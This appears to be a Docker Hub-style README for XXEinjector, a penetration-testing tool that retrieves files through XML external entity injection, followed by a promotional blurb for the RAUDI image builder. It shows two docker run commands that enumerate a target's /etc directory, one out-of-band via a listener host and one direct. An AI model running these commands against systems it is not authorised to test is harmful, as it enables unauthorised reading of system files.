# XXEInjector

## Official Documentation
Reference: https://github.com/enjoiz/XXEinjector

## Description
XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.

## Usage
Enumerating /etc directory in HTTPS application:
```
docker run -ti --rm -v ~/xxeinjector:/xxeinjector secsi/xxeinjector --host=192.168.0.2 --path=/etc --file=/xxeinjector/req.txt --ssl
```
Enumerating using direct exploitation:
```
docker run -ti --rm -v ~/xxeinjector:/xxeinjector secsi/xxeinjector  --file=/xxeinjector/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND
```

## 🐳 RAUDI: Regularly and Automatically Updated Docker Images

Hello, friend. This Docker Image has been created by RAUDI. What is RAUDI?

**RAUDI** (Regularly and Automatically Updated Docker Images) automatically generates and keep updated a series of *Docker Images* through *GitHub Actions* for tools that are not provided by the developers.

**RAUDI** is what will save you from creating and managing a lot of Docker Images manually. Every time a software is updated you need to update the Docker Image if you want to use the latest features, the dependencies are not working anymore. 

This is messy and time-consuming. 

Don't worry anymore, we got you covered.

If you want to contribute, give us a star or take a quick look at the source code of **RAUDI** click [here](https://github.com/cybersecsi/RAUDI).